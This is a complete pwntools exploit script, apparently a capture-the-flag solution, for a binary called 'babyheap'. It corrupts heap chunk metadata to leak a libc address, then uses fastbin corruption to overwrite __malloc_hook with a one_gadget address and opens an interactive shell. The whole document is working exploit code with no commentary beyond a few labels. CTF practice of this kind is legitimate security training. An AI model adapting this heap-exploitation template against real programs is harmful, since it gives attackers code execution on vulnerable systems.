from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

file = "./babyheap"

bin = ELF(file)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

conn = process(file)
#gdb.attach(conn)

def a(size, shell=True):
    conn.recvuntil("Command: ")
    conn.sendline("1")
    conn.recvuntil("Size: ")
    conn.sendline(str(size))
    if shell:
        return
    conn.recvuntil("Allocate Index")

def fill(index, content, size = None):
    conn.recvuntil("Command: ")
    conn.sendline("2")
    conn.recvuntil("Index: ")
    conn.sendline(str(index))
    conn.recvuntil("Size: ")
    if size is None:
        conn.sendline(str(len(content)))
    else:
        conn.sendline(str(size))
    conn.recvuntil("Content: ")
    conn.send(content)

def f(index):
    conn.recvuntil("Command: ")
    conn.sendline("3")
    conn.recvuntil("Index: ")
    conn.sendline(str(index))

def d(index):
    conn.recvuntil("Command: ")
    conn.sendline("4")
    conn.recvuntil("Index: ")
    conn.sendline(str(index))
    conn.recvuntil("Content: \n")

# House of Einherjar - getting libc leak

a(0x100) # 0
a(0x100) # 1
a(0x100) # 2

a(0x100) # 3

f(0)

payload = "\x00"*0x100 + p64(0x220) + p64(0x110)
fill(1, payload)
f(2)

a(0x100) # 0
a(0x100) # 2
f(2)
d(1)

libc_leak = u64(conn.recvn(8))
libc.address = libc_leak - 0x7f56d1f6ab78+ 0x7f56d1ba6000

# Clean the heap
f(0)
f(3)
# Now, only 1 chunk is reserved

# Fastbin corruption
a(0x60) # 0
a(0x60) # 2
f(2)

payload = "\x00"*0x68 + p64(0x71) + p64(libc.symbols['__malloc_hook'] - 0x23)
fill(0, payload)
a(0x60) # 2
a(0x60) # 3

payload = "\x00"*0x13 + p64(libc.address + 0x4526a) # one_gadget
fill(3, payload)

a(0x60, shell=True)

log.info("Libc leak: " + hex(libc_leak))

conn.interactive()
